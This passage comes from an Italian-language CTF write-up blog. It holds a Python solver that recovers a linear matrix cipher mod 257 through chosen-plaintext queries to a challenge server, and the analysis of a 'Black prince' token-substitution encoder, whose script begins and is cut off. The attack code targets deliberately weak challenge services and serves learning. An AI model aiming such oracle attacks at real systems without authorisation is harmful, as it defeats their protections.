</span></span><span class="line"><span class="cl"><span class="n">HEX3_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^(?:[0-9a-f]</span><span class="si">{3}</span><span class="s2">\s+)</span><span class="si">{256}</span><span class="s2">[0-9a-f]</span><span class="si">{3}</span><span class="s2">$&#34;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_hex_vector</span><span class="p">(</span><span class="n">blob</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Extract the final 257-entry hex vector from a server response.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">blob</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">HEX3_RE</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">tok</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">tok</span> <span class="ow">in</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()]</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Could not find a valid ciphertext line in server output.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Oracle wrappers</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_encrypted_flag</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Request option 1 from the server and parse the returned ciphertext.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv_until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_hex_vector</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">block</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Request option 2 and send a 257-byte block, returning the ciphertext.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">block</span><span class="p">)</span> <span class="o">==</span> <span class="n">N</span><span class="p">,</span> <span class="s2">&#34;block must be exactly N=257 bytes&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv_until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv_until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_hex_vector</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Modular algebra</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mat_inv_mod_p</span><span class="p">(</span><span class="n">A</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]],</span> <span class="n">p</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Compute the inverse of A modulo prime p using Gauss-Jordan.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span> <span class="o">=</span> <span class="p">[[</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">%</span> <span class="n">p</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">I</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">1</span> <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">j</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Find a pivot row with nonzero in column &#39;col&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pivot</span> <span class="o">=</span> <span class="n">col</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">pivot</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="ow">and</span> <span class="n">M</span><span class="p">[</span><span class="n">pivot</span><span class="p">][</span><span class="n">col</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pivot</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pivot</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Matrix not invertible (no pivot).&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Swap to current row if needed</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pivot</span> <span class="o">!=</span> <span class="n">col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="n">pivot</span><span class="p">]</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="n">pivot</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">],</span> <span class="n">I</span><span class="p">[</span><span class="n">pivot</span><span class="p">]</span> <span class="o">=</span> <span class="n">I</span><span class="p">[</span><span class="n">pivot</span><span class="p">],</span> <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Normalize pivot row</span>
</span></span><span class="line"><span class="cl">        <span class="n">inv_piv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">col</span><span class="p">],</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>  <span class="c1"># Fermat inverse (p is prime)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">inv_piv</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">            <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">inv_piv</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Eliminate this column from all other rows</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">r</span> <span class="o">==</span> <span class="n">col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">factor</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">col</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">factor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">M</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">factor</span> <span class="o">*</span> <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">                    <span class="n">I</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">I</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">factor</span> <span class="o">*</span> <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">I</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mat_vec_mod_p</span><span class="p">(</span><span class="n">M</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]],</span> <span class="n">v</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">],</span> <span class="n">p</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">row</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span> <span class="o">+=</span> <span class="n">row</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_matrix_K</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">K_cols</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">block</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># e_i (mod 257)</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">block</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span> <span class="o">!=</span> <span class="n">N</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;oracle returned wrong vector length&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">K_cols</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Optional progress indicator</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] collected </span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2"> columns of K&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Convert &#34;list of columns&#34; -&gt; 2D matrix (row-major)</span>
</span></span><span class="line"><span class="cl">    <span class="n">K</span> <span class="o">=</span> <span class="p">[[</span><span class="n">K_cols</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">K</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">strip_zero_padding</span><span class="p">(</span><span class="n">mbytes</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="mi">0</span> <span class="ow">in</span> <span class="n">mbytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">mbytes</span><span class="p">[:</span><span class="n">mbytes</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="mi">0</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">mbytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="k">else</span> <span class="s2">&#34;127.0.0.1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span> <span class="k">else</span> <span class="mi">12346</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Target: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Fetching encrypted flag...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c_flag</span> <span class="o">=</span> <span class="n">get_encrypted_flag</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Got encrypted flag (257 integers).&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Recovering encryption matrix K via 257 chosen-plaintext queries...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">K</span> <span class="o">=</span> <span class="n">recover_matrix_K</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Recovered K.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Inverting K modulo 257...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">K_inv</span> <span class="o">=</span> <span class="n">mat_inv_mod_p</span><span class="p">(</span><span class="n">K</span><span class="p">,</span> <span class="n">P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Inverted K.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Decrypting flag...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m_vec</span> <span class="o">=</span> <span class="n">mat_vec_mod_p</span><span class="p">(</span><span class="n">K_inv</span><span class="p">,</span> <span class="n">c_flag</span><span class="p">,</span> <span class="n">P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Sanity: we expect every coordinate to be in 0..255 (not 256)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m_vec</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Warning: found value 256 in plaintext vector; replacing with 0 for bytes().&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">0</span> <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">256</span> <span class="k">else</span> <span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m_vec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m_bytes</span> <span class="o">=</span> <span class="n">strip_zero_padding</span><span class="p">(</span><span class="n">m_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded</span> <span class="o">=</span> <span class="n">m_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;replace&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">m_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="black-prince">Black prince<a hidden class="anchor" aria-hidden="true" href="#black-prince">#</a></h3>
<h4 id="analisi-8">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-8">#</a></h4>
<ul>
<li>
<p>La ricognizione ha mostrato una web app molto semplice con due endpoint:</p>
<ul>
<li><code>/encode</code>: accetta un input limitato a lettere maiuscole A‚ÄìZ, cifre 0‚Äì9, parentesi graffe <code>{}</code> e underscore <code>_</code>, e restituisce una sequenza di token di quattro lettere.</li>
<li><code>/flag</code>: restituisce una lunga &ldquo;frase&rdquo; composta interamente da parole di quattro lettere (token) invece di una flag leggibile.</li>
</ul>
</li>
</ul>
<p><code>/encode</code> √® un encoder randomizzato che mappa ciascun carattere di input a una delle diverse possibili parole di quattro lettere. La pagina <code>/flag</code> √® la flag codificata usando quei token.</p>
<p>Una singola passata sull‚Äôalfabeto rivela solo un sottoinsieme di token. Per decodificare <code>/flag</code>, dobbiamo raccogliere tutte le varianti di token presenti in <code>/flag</code> interrogando ripetutamente <code>/encode</code> con caratteri ripetuti e registrando i riscontri che corrispondono ai token visti in <code>/flag</code>.</p>
<p>L‚Äôalfabeto consentito √® di 39 simboli (26 lettere + 10 cifre + <code>{</code>, <code>}</code>, <code>_</code>).</p>
<h4 id="soluzione-8">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-8">#</a></h4>
<p>La strategia √®: recuperare la sequenza ordinata di token da <code>/flag</code>, poi inviare ripetutamente <code>ch * N</code> per ogni carattere consentito a <code>/encode</code>, registrando qualsiasi token restituito che appaia anche su <code>/flag</code>. Quando ogni token di <code>/flag</code> ha un carattere mappato, ricostruiamo la flag per sostituzione in ordine. In pratica, ripetere un carattere fa emergere pi√π varianti di token.</p>
<h4 id="script-7">Script<a hidden class="anchor" aria-hidden="true" href="#script-7">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">List</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bs4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s1">&#39;http://168908dd.ctf.ac.upt.ro&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ROUNDS</span> <span class="o">=</span> <span class="mi">60</span>
</span></span><span class="line"><span class="cl"><span class="n">REPEATS</span> <span class="o">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="n">SLEEP</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">CHARSET</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">_&#39;</span>
